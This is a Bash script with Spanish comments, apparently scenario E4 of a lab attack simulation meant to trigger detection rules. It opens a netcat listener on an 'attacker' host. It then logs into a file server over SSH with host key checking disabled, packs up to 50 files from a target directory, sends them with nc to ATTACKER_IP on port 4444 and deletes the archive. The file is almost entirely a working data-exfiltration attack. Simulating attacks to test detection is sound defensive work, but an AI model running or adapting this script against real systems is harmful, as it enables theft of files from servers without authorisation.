#!/bin/bash
# E4 - Exfiltración de datos (muestra representativa, no dataset completo)
# Transfiere solo 5MB para demostrar el canal de exfiltración

set -uo pipefail
LOG=/var/log/lab/runner.jsonl
mkdir -p "$(dirname $LOG)"

log_event() {
    ts=$(date -u +%s%N)
    echo "{\"ts\":$ts,\"scenario\":\"E4\",\"event\":\"$1\"$([ -n "${2:-}" ] && echo ",\"data\":\"$2\"")}" | tee -a "$LOG"
}

TARGET_HOST="${TARGET_HOST:-fileserver}"
TARGET_USER="${TARGET_USER:-lab}"
TARGET_DIR="${TARGET_DIR:-/opt/labprueba}"
ATTACKER_IP="${ATTACKER_IP:-172.20.0.30}"
LISTENER_PORT="${LISTENER_PORT:-4444}"
SAMPLE_FILES=50   # Solo 50 ficheros 

log_event "start"

# Paso 1: preparar listener en el atacante (timeout de 30s)
mkdir -p /lab/stolen
DEST="/lab/stolen/exfil_$(date +%s).tar.gz"
log_event "step1_listener_start" "port=$LISTENER_PORT"
timeout 30 nc -l -p "$LISTENER_PORT" -q 0 > "$DEST" &
NC_PID=$!
sleep 1

# Paso 2: empaquetar MUESTRA y enviar (dispara 100231 y 100230)
log_event "step2_exfil_command"
ssh -o StrictHostKeyChecking=no \
    ${TARGET_USER}@${TARGET_HOST} "
	PKG=/tmp/exfil_\$(date +%s%N).tar.gz
	cd ${TARGET_DIR}
	tar czf \$PKG \$(ls | head -${SAMPLE_FILES}) 2>/dev/null
        nc -N ${ATTACKER_IP} ${LISTENER_PORT} < \$PKG
        rm -f \$PKG
    " 2>/dev/null || true

sleep 2
kill $NC_PID 2>/dev/null || true

# Paso 3: tamaño realmente recibido en el atacante
SIZE=$(stat -c%s "$DEST" 2>/dev/null || echo 0)
log_event "step3_exfil_complete" "size=$SIZE"
log_event "end"
